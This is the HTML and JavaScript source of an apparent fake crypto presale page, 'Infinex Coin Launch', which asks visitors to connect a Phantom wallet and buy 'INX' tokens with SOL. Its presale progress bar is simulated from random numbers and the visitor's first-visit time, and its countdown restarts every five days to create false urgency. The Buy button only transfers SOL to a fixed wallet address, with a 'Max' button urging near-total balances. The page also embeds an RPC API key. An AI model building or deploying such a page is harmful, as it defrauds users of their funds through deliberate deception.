<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Infinex Coin Launch</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #101114;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
        }

        header a {
            display: flex;
            align-items: center;
        }

        #title {
            font-family: 'Segoe UI';
            font-weight: bold;
            color: #fe6f39;
        }

        #connBtn {
            background-color: #23252a;
            color: #fff;
            border: none;
            padding: 12px 24px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            border-radius: 8px;
            transition: background-color 0.2s;
            transition: color 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            min-width: 160px;
            justify-content: center;
        }

        #connBtn.connected {
            background-color: #fe6f39;
            color: #23252a;
        }

        #main {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 500px;
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            letter-spacing: 1px;
        }

        #section {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }

        #top, #bottom {
            border-radius: 16px;
            background-color: #17191c;
            padding: 20px;
            border: 1px solid #23252a;
            position: relative;
            height: 140px;
        }

        .section-label {
            font-size: 12px;
            color: #777b84;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: absolute;
            top: 20px;
            left: 20px;
        }

        .input-container {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 8px;
        }

        #amountInput {
            outline: none;
            border: none;
            background-color: transparent;
            color: #fff;
            font-size: 32px;
            font-weight: 600;
            text-align: right;
            transition: color 0.2s;
            width: 100%;
        }

        #amountInput::placeholder {
            color: #777b84;
        }

        #amountInput.invalid {
            color: #f87171;
        }

        #receiveInput {
            outline: none;
            border: none;
            background-color: transparent;
            color: #fff;
            font-size: 32px;
            font-weight: 600;
            text-align: right;
            width: 100%;
        }

        #receiveInput::placeholder {
            color: #777b84;
        }

        #receiveUsd {
            font-size: 14px;
            color: #777b84;
            text-align: right;
        }

        #usdBtn {
            background-color: #17191c;
            color: #888;
            border: none;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            border-radius: 6px;
            transition: all 0.2s;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        #usdBtn:hover {
            color: #fff;
        }

        #usdBtn.invalid {
            color: #3a3c42;
        }

        #usdBtn svg {
            width: 12px;
            height: 12px;
            flex-shrink: 0;
        }

        #maxBtn {
            background-color: #23252a;
            color: #fff;
            border: none;
            padding: 6px 14px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            border-radius: 6px;
            transition: background-color 0.2s;
            white-space: nowrap;
        }

        #maxBtn:hover {
            background-color: #2d2f36;
        }

        .token-badge {
            position: absolute;
            bottom: 52px;
            left: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background-color: #23252a;
            padding: 8px 14px 8px 10px;
            border-radius: 100px;
            border: 1px solid #33353b;
        }

        #bottom .token-badge {
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            bottom: auto;
        }

        .token-logo {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .token-name {
            font-size: 14px;
            font-weight: 600;
            color: #fff;
        }

        .balance-info {
            position: absolute;
            bottom: 20px;
            left: 20px;
            font-size: 13px;
            color: #888;
        }

        #buyBtn {
            width: 100%;
            background-color: #fe6f39;
            color: #23252a;
            border: none;
            padding: 18px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            border-radius: 16px;
            transition: background-color 0.2s;
        }

        #buyBtn:hover:not(:disabled) {
            background-color: #ff7f4d;
        }

        #logoLink svg {
            color: #FE6F39;
            transition: color .25s;
        }

        #logoLink:hover svg {
            color: #ff7f4d;
        }

        #connBtn:hover {
            background-color: #ff7f4d;
            color: #23252a;
        }

        #buyBtn:disabled {
            background-color: #2d2f36;
            cursor: not-allowed;
        }

        .status-message {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #777b84;
            min-height: 20px;
        }

        .status-message.success {
            color: #4ade80;
        }

        .status-message.error {
            color: #f87171;
        }

        #progress-container {
            background-color: #17191c;
            border: 1px solid #23252a;
            border-radius: 16px;
            width: 100%;
            padding: 20px;
            margin-top: 20px;
        }

        #progressBar {
            height: 25px;
            width: 0%;
            background: #fe6f39;
            border-radius: 25px;
            transition: width 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        #progressBar::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            animation: shimmer 2s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .progress-bar-container {
            background-color: #23252a;
            border-radius: 25px;
            overflow: hidden;
            margin-bottom: 15px;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            font-size: 14px;
            color: #777b84;
        }

        .progress-stats {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            color: #888;
        }

        .progress-timer {
            font-size: 16px;
            font-weight: 600;
            color: #fe6f39;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <header>
        <a href="/" id="logoLink">
            <svg xmlns="http://www.w3.org/2000/svg" width="135" height="20" viewBox="0 0 135 20" fill="none"><path d="M5.25 15H14.25V7H19.25V20H0.25V0H5.25V15Z" fill="currentColor"/><path d="M26.25 20H21.25V5H12.25V13H7.25V0H26.25V20Z" fill="currentColor"/><path d="M40.25 18H35.25V2H40.25V18Z" fill="currentColor"/><path d="M53.25 10V2H58.25V18H53.25L47.25 10V18H42.25V2H47.25L53.25 10Z" fill="currentColor"/><path d="M74.25 6H65.25V8H73.75V12H65.25V18H60.25V2H74.25V6Z" fill="currentColor"/><path d="M81.25 18H76.25V2H81.25V18Z" fill="currentColor"/><path d="M94.25 10V2H99.25V18H94.25L88.25 10V18H83.25V2H88.25L94.25 10Z" fill="currentColor"/><path d="M115.25 6H106.25V8H114.75V12H106.25V14H115.25V18H101.25V2H115.25V6Z" fill="currentColor"/><path d="M125.75 6L128.75 2H134.75L128.75 10L134.75 18H128.75L125.75 14L122.75 18H116.75L122.75 10L116.75 2H122.75L125.75 6Z" fill="currentColor"/></svg>
        </a>
        <button id="connBtn">Connect Wallet</button>
    </header>

    <div id="main">
        <h1 id="title">INFINEX COIN LAUNCH</h1>
        <div id="section">
            <div id="top">
                <div class="input-container">
                    <input id="amountInput" type="text" inputmode="decimal" step="any" placeholder="0" min="0" autocomplete="off">
                    <button id="usdBtn">
                        <span id="usdBtnText">$0.00</span>
                        <svg aria-hidden="true" fill="currentColor" focusable="false" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M8.404 12.654V5.374L5.569 8.207L4.5 7.154L9.154 2.5L13.808 7.154L12.738 8.208L9.904 5.373V12.653H8.404V12.654ZM14.836 21.5L10.183 16.846L11.252 15.792L14.086 18.627V11.347H15.586V18.627L18.421 15.792L19.491 16.846L14.836 21.5Z"></path></svg>
                    </button>
                    <button id="maxBtn">Max</button>
                </div>
                <div class="token-badge">
                    <div class="token-logo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="8" fill="black"/><path d="M4.80284 4.34665C4.86239 4.28561 4.94099 4.25 5.02198 4.25H12.5821C12.7202 4.25 12.7893 4.42804 12.6916 4.53232L11.1982 6.12703C11.141 6.18808 11.0624 6.22368 10.9791 6.22368H3.41897C3.28083 6.22368 3.21175 6.04565 3.30941 5.94137L4.80284 4.34665Z" fill="url(#paint0_linear_1851_22112)"/><path d="M4.80286 9.87296C4.86002 9.81192 4.93863 9.77632 5.02199 9.77632H12.5821C12.7202 9.77632 12.7893 9.95435 12.6916 10.0586L11.1982 11.6533C11.141 11.7144 11.0624 11.75 10.9791 11.75H3.41899C3.28084 11.75 3.21177 11.572 3.30942 11.4677L4.80286 9.87296Z" fill="url(#paint1_linear_1851_22112)"/><path d="M10.9791 7.01316C11.0624 7.01316 11.141 7.04876 11.1982 7.10981L12.6916 8.70452C12.7893 8.8088 12.7202 8.98684 12.5821 8.98684H5.02199C4.93863 8.98684 4.86002 8.95123 4.80286 8.89019L3.30942 7.29548C3.21177 7.1912 3.28084 7.01316 3.41899 7.01316H10.9791Z" fill="url(#paint2_linear_1851_22112)"/><defs><linearGradient id="paint0_linear_1851_22112" x1="10.7087" y1="2.46076" x2="4.91676" y2="12.8501" gradientUnits="userSpaceOnUse"><stop stop-color="#00FFA3"/><stop offset="1" stop-color="#DC1FFF"/></linearGradient><linearGradient id="paint1_linear_1851_22112" x1="10.7087" y1="2.46076" x2="4.91676" y2="12.8501" gradientUnits="userSpaceOnUse"><stop stop-color="#00FFA3"/><stop offset="1" stop-color="#DC1FFF"/></linearGradient><linearGradient id="paint2_linear_1851_22112" x1="10.7087" y1="2.46076" x2="4.91676" y2="12.8501" gradientUnits="userSpaceOnUse"><stop stop-color="#00FFA3"/><stop offset="1" stop-color="#DC1FFF"/></linearGradient></defs></svg>
                    </div>
                    <span class="token-name" id="currencyLabel">SOL</span>
                </div>
                <div class="balance-info" id="balanceDisplay">
                    <svg aria-hidden="true" fill="#fff" focusable="false" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="shrink-0 grow-0 size-2xsmall flex-shrink-0" slot="icon"><path d="M6 19.4999C5.035 19.4999 4.21 19.1579 3.526 18.4739C3.19506 18.1535 2.93329 17.7686 2.75683 17.3431C2.58037 16.9176 2.49296 16.4605 2.5 15.9999V7.99991C2.5 7.03491 2.842 6.20991 3.526 5.52591C3.84642 5.19497 4.23126 4.9332 4.65676 4.75674C5.08226 4.58028 5.53941 4.49287 6 4.49991H18C18.965 4.49991 19.79 4.8419 20.474 5.52591C20.8049 5.84633 21.0667 6.23117 21.2432 6.65667C21.4196 7.08217 21.507 7.53932 21.5 7.99991V15.9999C21.5 16.9649 21.158 17.7899 20.474 18.4739C20.1536 18.8048 19.7687 19.0666 19.3432 19.2431C18.9177 19.4195 18.4606 19.5069 18 19.4999H6ZM6 8.24991H18C18.38 8.24991 18.738 8.3049 19.074 8.4139C19.41 8.5229 19.719 8.6879 20 8.9099V7.99991C20 7.44991 19.804 6.9799 19.413 6.5879C19.2302 6.39854 19.0104 6.24866 18.7674 6.14753C18.5244 6.0464 18.2632 5.99615 18 5.9999H6C5.45 5.9999 4.98 6.1959 4.588 6.5879C4.39875 6.77063 4.24895 6.99019 4.14782 7.23303C4.04669 7.47588 3.99638 7.73687 4 7.99991V8.9099C4.28 8.6879 4.59 8.5229 4.926 8.4139C5.27314 8.30309 5.6356 8.24774 6 8.24991ZM4.092 11.2399L15.323 13.9699C15.461 14.0033 15.6048 14.0044 15.7432 13.973C15.8817 13.9416 16.011 13.8786 16.121 13.7889L19.721 10.7639C19.5555 10.4611 19.3121 10.208 19.016 10.0309C18.7104 9.84374 18.3583 9.74636 18 9.74991H6C5.55897 9.74035 5.12818 9.88343 4.78051 10.1549C4.43283 10.4264 4.18961 10.8097 4.092 11.2399Z"></path></svg>
                </div>
            </div>
            <div id="bottom">
                <div class="section-label">You Receive</div>
                <div class="input-container">
                    <input id="receiveInput" type="text" inputmode="decimal" placeholder="0" readonly>
                    <div id="receiveUsd">$0.00</div>
                </div>
                <div class="token-badge">
                    <div class="token-logo">
                        <svg fill="#fe6f39" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 20" width="20" height="20" class="fill-brand size-10"><path d="M5 15H14V7H19V20H0V0H5V15Z"></path><path d="M26 20H21V5H12V13H7V0H26V20Z"></path></svg>
                    </div>
                    <span class="token-name">INX</span>
                </div>
            </div>
        </div>
        <button id="buyBtn">Buy Infinex Coin</button>
        <div class="status-message" id="statusMsg"></div>

        <div id="progress-container">
            <div class="progress-info">
                <span>Presale Progress</span>
                <span id="percentageText">0%</span>
            </div>
            <div class="progress-bar-container">
                <div id="progressBar"></div>
            </div>
            <div class="progress-stats">
                <span id="currentSol">0 SOL</span>
                <span id="goalText">/ 50,000 SOL</span>
            </div>
            <div class="progress-timer" id="timerDisplay">Time remaining: 3d 0h 0m 0s</div>
        </div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        const { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey, clusterApiUrl } = solanaWeb3;

        const connBtn = document.getElementById('connBtn');
        const amountInput = document.getElementById('amountInput');
        const receiveInput = document.getElementById('receiveInput');
        const receiveUsd = document.getElementById('receiveUsd');
        const buyBtn = document.getElementById('buyBtn');
        const usdBtn = document.getElementById('usdBtn');
        const usdBtnText = document.getElementById('usdBtnText');
        const maxBtn = document.getElementById('maxBtn');
        const balanceDisplay = document.getElementById('balanceDisplay');
        const currencyLabel = document.getElementById('currencyLabel');
        const statusMsg = document.getElementById('statusMsg');
        const progressBar = document.getElementById('progressBar');
        const percentageText = document.getElementById('percentageText');
        const currentSol = document.getElementById('currentSol');
        const timerDisplay = document.getElementById('timerDisplay');

        let solPrice = 0;
        let userBalance = 0;
        let isUsdMode = false;
        const INX_RATE = 362;
        const GOAL_SOL = 50000;
        const GOAL_DURATION = 4 * 24 * 60 * 60 * 1000;
        const CYCLE_DURATION = 5 * 24 * 60 * 60 * 1000;

        let presaleData = {
            firstVisit: null,
            lastSimulatedSol: 0
        };

        function loadProgress() {
            const saved = localStorage.getItem('infinexPresale');
            if (saved) {
                presaleData = JSON.parse(saved);
            }
            
            if (!presaleData.firstVisit) {
                presaleData.firstVisit = Date.now();
                saveProgress();
            }
        }

        function saveProgress() {
            localStorage.setItem('infinexPresale', JSON.stringify(presaleData));
        }

        function getCurrentCycleElapsed() {
            const totalElapsed = Date.now() - presaleData.firstVisit;
            const cycleElapsed = totalElapsed % CYCLE_DURATION;
            return cycleElapsed;
        }

        function getBaseSolFromTime() {
            const cycleElapsed = getCurrentCycleElapsed();
            
            const timeProgress = Math.min(cycleElapsed / GOAL_DURATION, 1);
            return timeProgress * GOAL_SOL;
        }

        function simulateBuyIns() {
            const baseSol = getBaseSolFromTime();
            
            const variation = (Math.random() - 0.5) * 0.04 * baseSol;
            const targetSol = Math.max(0, Math.min(baseSol + variation, GOAL_SOL));
            
            if (typeof presaleData.lastSimulatedSol !== 'number' || isNaN(presaleData.lastSimulatedSol)) {
                presaleData.lastSimulatedSol = 0;
            }
            
            const diff = targetSol - presaleData.lastSimulatedSol;
            
            if (Math.abs(diff) > 0.1) {
                if (Math.random() < 0.15) {
                    const jumpSize = Math.min(Math.abs(diff) * 0.3, 50);
                    presaleData.lastSimulatedSol += diff > 0 ? jumpSize : -jumpSize;
                } else {
                    presaleData.lastSimulatedSol += diff * 0.05;
                }
                
                presaleData.lastSimulatedSol = Math.max(0, Math.min(presaleData.lastSimulatedSol, GOAL_SOL));
                
                saveProgress();
            }
            
            updateProgressDisplay();
        }

        function updateProgressDisplay() {
            const cycleElapsed = getCurrentCycleElapsed();
            const displaySol = Math.min(Math.max(0, presaleData.lastSimulatedSol), GOAL_SOL);
            
            const percentage = Math.min((displaySol / GOAL_SOL) * 100, 100);
            progressBar.style.width = `${percentage}%`;
            percentageText.textContent = `${percentage.toFixed(1)}%`;
            currentSol.textContent = `${displaySol.toFixed(2)} SOL`;
            
            const remaining = CYCLE_DURATION - cycleElapsed;
            const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
            const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
            const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
            const seconds = Math.floor((remaining % (60 * 1000)) / 1000);
            
            timerDisplay.textContent = `Time remaining: ${days}d ${hours}h ${minutes}m ${seconds}s`;
        }

        async function fetchSolPrice() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
                const data = await response.json();
                solPrice = data.solana.usd;
                return solPrice;
            } catch (err) {
                solPrice = 0;
                return 0;
            }
        }

        function getProvider() {
            if ('phantom' in window) {
                const provider = window.phantom?.solana;
                if (provider?.isPhantom) {
                    return provider;
                }
            }
            window.open('https://phantom.app/', '_blank');
            return null;
        }

        async function connectWallet() {
            const provider = getProvider();
            if (!provider) return;

            try {
                const resp = await provider.connect();
                updateConnectButton(true);
                await updateBalance();
            } catch (err) {
                showStatus('Failed to connect wallet', 'error');
            }
        }

        async function disconnectWallet() {
            const provider = window.solana;
            if (provider?.isConnected) {
                try {
                    await provider.disconnect();
                    updateConnectButton(false);
                    userBalance = 0;
                    balanceDisplay.textContent = '';
                    amountInput.value = '';
                    updateDisplay();
                } catch (err) {
                }
            }
        }

        function updateConnectButton(connected) {
            if (connected) {
                const provider = window.solana;
                const address = provider.publicKey.toString();
                const shortAddress = `${address.slice(0, 4)}...${address.slice(-4)}`;
                
                connBtn.innerHTML = `
                    <svg width="25" height="25" viewBox="0 0 1200 1200" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip0_2596_138588)">
                    <rect width="1200" height="1200" rx="257.592" fill="#AB9FF2"/>
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M517.219 779.814C470.102 852.012 391.148 943.378 286.09 943.378C236.426 943.378 188.672 922.933 188.672 834.122C188.672 607.943 497.48 257.813 784.004 257.813C947.004 257.813 1011.95 370.902 1011.95 499.326C1011.95 664.168 904.98 852.651 798.648 852.651C764.902 852.651 748.347 834.122 748.347 804.732C748.347 797.065 749.621 788.759 752.168 779.814C715.875 841.789 645.836 899.292 580.254 899.292C532.5 899.292 508.305 869.263 508.305 827.094C508.305 811.76 511.488 795.787 517.219 779.814ZM904.363 494.869C904.363 532.291 882.284 551.002 857.586 551.002C832.514 551.002 810.809 532.291 810.809 494.869C810.809 457.448 832.514 438.737 857.586 438.737C882.284 438.737 904.363 457.448 904.363 494.869ZM764.031 494.871C764.031 532.293 741.952 551.004 717.254 551.004C692.182 551.004 670.477 532.293 670.477 494.871C670.477 457.449 692.182 438.739 717.254 438.739C741.952 438.739 764.031 457.449 764.031 494.871Z" fill="#FFFDF8"/>
                    </g>
                    <defs>
                    <clipPath id="clip0_2596_138588">
                    <rect width="1200" height="1200" fill="white"/>
                    </clipPath>
                    </defs>
                    </svg>
                    <span>${shortAddress}</span>
                `;
                connBtn.classList.add('connected');
            } else {
                connBtn.textContent = 'Connect Wallet';
                connBtn.classList.remove('connected');
            }
        }

        async function updateBalance() {
            const provider = window.solana;
            if (!provider?.isConnected) return;

            try {
                const publicKey = new PublicKey(provider.publicKey.toString());
                const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=55491b69-8a3d-46e2-85ae-e898dec87b15', 'confirmed');
                
                let retries = 3;
                while (retries > 0) {
                    try {
                        const lamports = await connection.getBalance(publicKey);
                        userBalance = lamports / LAMPORTS_PER_SOL;
                        balanceDisplay.textContent = `${Number(userBalance.toFixed(3)).toString()} SOL (â‰ˆ $${Number((userBalance * solPrice).toFixed(3)).toString()})`;
                        return;
                    } catch (err) {
                        retries--;
                        if (retries === 0) throw err;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            } catch (err) {
                console.error('Balance fetch error:', err);
                balanceDisplay.textContent = 'Unable to fetch balance';
                showStatus('Failed to fetch balance. Please try reconnecting.', 'error');
            }
        }

        async function sendTransaction(solAmount) {
            const provider = getProvider();
            if (!provider?.isConnected) {
                showStatus('Please connect your wallet', 'error');
                return;
            }

            const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=55491b69-8a3d-46e2-85ae-e898dec87b15', 'confirmed');
            const recipientPublicKey = new PublicKey("B6Pg9QERSazmmSSnUewvC6VAcEtiV2tWLomZ2bBaCxBh");

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: provider.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: Math.floor(solAmount * LAMPORTS_PER_SOL),
                })
            );

            transaction.feePayer = provider.publicKey;
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;

            try {
                showStatus('Processing transaction...', '');
                const { signature } = await provider.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature);
                showStatus('Transaction successful!', 'success');
                await updateBalance();
                amountInput.value = '';
                updateDisplay();
            } catch (err) {
                showStatus('Transaction failed', 'error');
            }
        }

        function showStatus(message, type) {
            statusMsg.textContent = message;
            statusMsg.className = `status-message ${type}`;
            if (message) {
                setTimeout(() => {
                    statusMsg.textContent = '';
                    statusMsg.className = 'status-message';
                }, 5000);
            }
        }

        function formatNumberForDisplay(value, decimals = 3) {
            if (value === 0) return '0';
            const num = parseFloat(value);
            if (isNaN(num)) return '0';
            return num.toFixed(decimals).replace(/\.?0+$/, '');
        }

        function updateDisplay() {
            let inputValue = amountInput.value;
            
            if (isUsdMode) {
                inputValue = inputValue.replace(/^\$/, '');
            }
            
            const value = parseFloat(inputValue) || 0;
            const provider = window.solana;
            const isConnected = provider?.isConnected;
            
            let solAmount;
            if (isUsdMode && solPrice > 0) {
                solAmount = value / solPrice;
            } else {
                solAmount = value;
            }
            
            const isValid = value > 0 && (!isConnected || solAmount <= userBalance * 1.0001);
            
            buyBtn.disabled = !isValid || value <= 0;
            
            if (amountInput.value && value < 0) {
                amountInput.classList.add('invalid');
                usdBtn.classList.add('invalid');
            } else if (isConnected && value > 0) {
                if (solAmount > userBalance * 1.0001) {
                    amountInput.classList.add('invalid');
                    usdBtn.classList.add('invalid');
                } else {
                    amountInput.classList.remove('invalid');
                    usdBtn.classList.remove('invalid');
                }
            } else {
                amountInput.classList.remove('invalid');
                usdBtn.classList.remove('invalid');
            }
            
            if (isUsdMode) {
                const solValue = solPrice > 0 ? value / solPrice : 0;
                usdBtnText.textContent = `${formatNumberForDisplay(solValue)}`;
                receiveInput.value = `$${formatNumberForDisplay(value, 2)}`;
                receiveUsd.textContent = `${formatNumberForDisplay(solValue * INX_RATE)}`;
            } else {
                const usdValue = value * solPrice;
                usdBtnText.textContent = `$${formatNumberForDisplay(usdValue, 2)}`;
                receiveInput.value = `${formatNumberForDisplay(value * INX_RATE)}`;
                receiveUsd.textContent = `$${formatNumberForDisplay(usdValue, 2)}`;
            }
        }

        function toggleCurrency() {
            let inputValue = amountInput.value;
            
            if (isUsdMode) {
                inputValue = inputValue.replace(/^\$/, '');
            }
            
            const currentValue = parseFloat(inputValue) || 0;
            isUsdMode = !isUsdMode;

            if (isUsdMode) {
                const usdValue = currentValue * solPrice;
                amountInput.value = formatNumberForDisplay(usdValue, 2);
                amountInput.placeholder = '$0'
            } else {
                const solValue = solPrice > 0 ? currentValue / solPrice : 0;
                amountInput.value = formatNumberForDisplay(solValue);
                amountInput.placeholder = '0'
            }
            
            updateDisplay();
            handleInputChange();
        }

        function handleInputChange() {
            let value = amountInput.value;
            
            if (isUsdMode) {
                value = value.replace(/\$/g, '');
                
                const numValue = value;
                
                if (value !== '' && value !== '0') {
                    amountInput.value = '$' + numValue;
                    
                    setTimeout(() => {
                        amountInput.setSelectionRange(amountInput.value.length, amountInput.value.length);
                    }, 0);
                } else if (value === '') {
                    amountInput.value = '';
                }
            }
            
            updateDisplay();
        }

        function handleKeyDown(e) {
            if (isUsdMode) {
                const cursorPos = e.target.selectionStart;
                const value = e.target.value;
                
                if ((e.key === 'Backspace' || e.key === 'Delete') && cursorPos <= 1 && value.startsWith('$')) {
                    e.preventDefault();
                }
                
                if ((e.key === 'ArrowLeft' || e.key === 'Home') && cursorPos <= 1 && value.startsWith('$')) {
                    e.preventDefault();
                }
            }
        }

        function handleClick(e) {
            if (isUsdMode && amountInput.value.startsWith('$')) {
                const cursorPos = e.target.selectionStart;
                if (cursorPos === 0) {
                    setTimeout(() => {
                        amountInput.setSelectionRange(1, 1);
                    }, 0);
                }
            }
        }

        connBtn.addEventListener('click', async () => {
            const provider = window.solana;
            if (provider?.isConnected) {
                await disconnectWallet();
            } else {
                await connectWallet();
            }
        });

        amountInput.addEventListener('input', handleInputChange);
        amountInput.addEventListener('keydown', handleKeyDown);
        amountInput.addEventListener('click', handleClick);

        buyBtn.addEventListener('click', async () => {
            let inputValue = amountInput.value;
            if (isUsdMode) {
                inputValue = inputValue.replace(/^\$/, '');
            }
            
            const value = parseFloat(inputValue) || 0;
            const solAmount = isUsdMode && solPrice > 0 ? value / solPrice : value;

            if (solAmount <= 0) {
                showStatus('Please enter a valid amount', 'error');
                return;
            }

            if (solAmount > userBalance) {
                showStatus('Insufficient balance', 'error');
                return;
            }

            await sendTransaction(solAmount);
        });

        usdBtn.addEventListener('click', toggleCurrency);

        maxBtn.addEventListener('click', () => {
            const maxBalance = userBalance - (0.1 / 142);
            
            if (isUsdMode) {
                amountInput.value = formatNumberForDisplay(maxBalance * solPrice, 2);
            } else {
                amountInput.value = formatNumberForDisplay(maxBalance);
            }
            handleInputChange();
        });

        loadProgress();
        fetchSolPrice();
        setInterval(fetchSolPrice, 60000);
        
        setInterval(simulateBuyIns, 2000);
        
        setInterval(updateProgressDisplay, 1000);

        simulateBuyIns();

        window.addEventListener('load', async () => {
            const provider = window.solana;
            if (provider?.isConnected) {
                updateConnectButton(true);
                await updateBalance();
            }
            
            if (provider) {
                provider.on('connect', () => {
                    updateConnectButton(true);
                    updateBalance();
                });
                
                provider.on('disconnect', () => {
                    updateConnectButton(false);
                });
            }
        });
    </script>
</body>
</html>
